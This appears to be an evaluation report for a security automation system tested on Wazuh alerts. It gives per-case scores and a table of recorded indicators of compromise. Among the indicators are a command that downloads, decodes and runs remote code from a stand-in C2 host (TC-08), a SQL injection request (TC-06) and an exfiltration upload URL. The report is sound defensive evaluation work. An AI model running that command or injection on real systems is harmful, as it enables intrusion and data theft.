# Phase 2E report - clean-p2e-real-wazuh-20261008

Database `soar_p2e_eval` · ground truth sha256 `9a800baba905dfc8aca73810ef9f4984ac5923b3909eb013984bd11fcc69f6de` · baselines: `final-main-real-wazuh-20261001`, `clean-v2-real-wazuh-20260930`

Provenance of each case's alert is derived from the stored alert (Evidence Contract v2 `classifyProvenance`): **REAL_TELEMETRY** = stock Wazuh rule on a real agent log; **HARNESS_GENERATED** = real Wazuh pipeline, log line written by the evaluation harness (rules 100300-100350). Numbers from the two groups must not be pooled into a claim about real telemetry.

**Not run in this report:** TC-05.

## Summary by provenance

| Provenance | Cases | Compliant | IOC recall (found/expected) | RESOLVED |
|---|---|---|---|---|
| REAL_TELEMETRY | TC-01, TC-04, TC-06 | 3/3 | 5/5 | 3/3 |
| HARNESS_GENERATED | TC-02, TC-03, TC-07, TC-08, TC-09, TC-10 | 6/6 | 17/17 | 5/6 |

Re-hunt classification of the new run: NO_MATCH_COVERED 8, (not classified) 1

## Per case

| Case | Telemetry label | Provenance | IOC recall new (baselines) | Compliance new (baselines) | Verification new | Re-hunt class | Verification baselines |
|---|---|---|---|---|---|---|---|
| TC-01 Brute Force | REAL_EVENTS_STOCK_RULE | REAL_TELEMETRY | 2/2 (2/2 / 2/2) | COMPLIANT (COMPLIANT / COMPLIANT) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; RESOLVED/REAL_WAZUH |
| TC-02 Malware | REAL_ACTION_CUSTOM_RULE | HARNESS_GENERATED | 2/2 (0/2 / 0/2) | COMPLIANT (COMPLIANT / COMPLIANT) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | -/NONE ; -/NONE |
| TC-03 Phishing | CONTROLLED_TELEMETRY_CUSTOM_RULE | HARNESS_GENERATED | 4/4 (4/4 / 4/4) | COMPLIANT (COMPLIANT / NOT_EVALUATED) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; -/NONE |
| TC-04 Account Compromise | REAL_EVENTS_STOCK_RULE | REAL_TELEMETRY | 2/2 (2/2 / 2/2) | COMPLIANT (COMPLIANT / COMPLIANT) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; RESOLVED/REAL_WAZUH |
| TC-06 SQL Injection | REAL_EVENTS_STOCK_RULE | REAL_TELEMETRY | 1/1 (1/1 / 1/1) | COMPLIANT (COMPLIANT / COMPLIANT) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; RESOLVED/REAL_WAZUH |
| TC-07 Command & Control | CONTROLLED_TELEMETRY_CUSTOM_RULE | HARNESS_GENERATED | 3/3 (3/3 / 3/3) | COMPLIANT (COMPLIANT / COMPLIANT) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; RESOLVED/REAL_WAZUH |
| TC-08 Suspicious Process | CONTROLLED_TELEMETRY_CUSTOM_RULE | HARNESS_GENERATED | 4/4 (0/2 / 0/2) | COMPLIANT (COMPLIANT / NOT_EVALUATED) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; -/NONE |
| TC-09 Data Exfiltration | CONTROLLED_TELEMETRY_CUSTOM_RULE | HARNESS_GENERATED | 3/3 (3/3 / 3/3) | COMPLIANT (COMPLIANT / COMPLIANT) | RESOLVED (REAL_WAZUH) | NO_MATCH_COVERED | RESOLVED/REAL_WAZUH ; RESOLVED/REAL_WAZUH |
| TC-10 Privilege Escalation | REAL_ACTION_CUSTOM_RULE | HARNESS_GENERATED | 1/1 (1/1 / 1/1) | COMPLIANT (COMPLIANT / COMPLIANT) | - (NONE) | - | -/NONE ; -/NONE |

## IOC roles recorded (ioc_observations)

| Case | IOC | path | role | provenance |
|---|---|---|---|---|
| TC-01 | `IPV4` `172.19.0.5` | data.srcip | SOURCE | REAL_TELEMETRY |
| TC-01 | `USERNAME` `git` | data.srcuser | ACTOR | REAL_TELEMETRY |
| TC-02 | `FILE_PATH` `/root/Downloads/Invoice_Q4_2026.xls.exe` | syscheck.path | ARTIFACT | HARNESS_GENERATED |
| TC-02 | `MD5` `44d88612fea8a8f36de82e1278abb02f` | syscheck.md5_after | ARTIFACT | HARNESS_GENERATED |
| TC-02 | `SHA1` `3395856ce81f2b7382dee72602f798b642f14140` | syscheck.sha1_after | ARTIFACT | HARNESS_GENERATED |
| TC-02 | `SHA256` `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f` | syscheck.sha256_after | ARTIFACT | HARNESS_GENERATED |
| TC-03 | `IPV4` `203.0.113.45` | data.srcip | SOURCE | HARNESS_GENERATED |
| TC-03 | `DOMAIN` `vigix-eval-phish.net` | data.dns.question.name | ARTIFACT | HARNESS_GENERATED |
| TC-03 | `URL` `http://vigix-eval-phish.net/o365/verify?id=hr.clerk` | data.url | ARTIFACT | HARNESS_GENERATED |
| TC-03 | `DOMAIN` `vigix-eval-phish.net` | data.url | ARTIFACT | HARNESS_GENERATED |
| TC-03 | `EMAIL` `it-support@vigix-eval-phish.net` | data.email.from | SOURCE | HARNESS_GENERATED |
| TC-03 | `EMAIL` `hr.clerk@corp.local` | data.email.to | TARGET | HARNESS_GENERATED |
| TC-04 | `IPV4` `172.19.0.5` | data.srcip | SOURCE | REAL_TELEMETRY |
| TC-04 | `USERNAME` `victim` | data.dstuser | TARGET | REAL_TELEMETRY |
| TC-06 | `IPV4` `172.19.0.5` | data.srcip | SOURCE | REAL_TELEMETRY |
| TC-06 | `HTTP_REQUEST` `/app/search.php?id=1%20union%20select%20username,password%20from%20use` | data.url | ARTIFACT | REAL_TELEMETRY |
| TC-07 | `IPV4` `172.19.0.7` | data.srcip | ENDPOINT_SELF | HARNESS_GENERATED |
| TC-07 | `IPV4` `172.19.0.8` | data.dstip | DESTINATION | HARNESS_GENERATED |
| TC-07 | `DOMAIN` `vigix-eval-c2.net` | data.dns.question.name | ARTIFACT | HARNESS_GENERATED |
| TC-07 | `URL` `http://vigix-eval-c2.net:8080/gate.php` | data.url | ARTIFACT | HARNESS_GENERATED |
| TC-07 | `DOMAIN` `vigix-eval-c2.net` | data.url | ARTIFACT | HARNESS_GENERATED |
| TC-08 | `SHA256` `c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64` | data.sha256 | ARTIFACT | HARNESS_GENERATED |
| TC-08 | `FILE_PATH` `/tmp/.cache/kworkerd` | data.file | ARTIFACT | HARNESS_GENERATED |
| TC-08 | `PROCESS_NAME` `/tmp/.cache/kworkerd` | data.audit.exe | ARTIFACT | HARNESS_GENERATED |
| TC-08 | `COMMAND_LINE` `curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash` | data.command | ARTIFACT | HARNESS_GENERATED |
| TC-08 | `COMMAND_LINE` `curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash` | data.audit.command | ARTIFACT | HARNESS_GENERATED |
| TC-09 | `IPV4` `172.19.0.7` | data.srcip | ENDPOINT_SELF | HARNESS_GENERATED |
| TC-09 | `IPV4` `172.19.0.8` | data.dstip | DESTINATION | HARNESS_GENERATED |
| TC-09 | `DOMAIN` `vigix-eval-exfil.net` | data.dns.question.name | ARTIFACT | HARNESS_GENERATED |
| TC-09 | `URL` `http://vigix-eval-exfil.net:8080/upload` | data.url | ARTIFACT | HARNESS_GENERATED |
| TC-09 | `DOMAIN` `vigix-eval-exfil.net` | data.url | ARTIFACT | HARNESS_GENERATED |
| TC-09 | `FILE_PATH` `/tmp/test-data.txt` | data.file | ARTIFACT | HARNESS_GENERATED |
| TC-10 | `USERNAME` `evaluser` | data.dstuser | TARGET | HARNESS_GENERATED |

## Recommended targets that are the reporting host's own address

None of the recommended targets is recorded as ENDPOINT_SELF.

## Re-hunt detail

| Case | result | class | matching | total matched | ignored | spread | recurrence | contained | coverage complete | gaps |
|---|---|---|---|---|---|---|---|---|---|---|
| TC-01 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-02 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-03 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-04 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-06 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-07 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-08 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
| TC-09 | RESOLVED | NO_MATCH_COVERED | 0 | 0 | 0 | false | false | true | true | - |
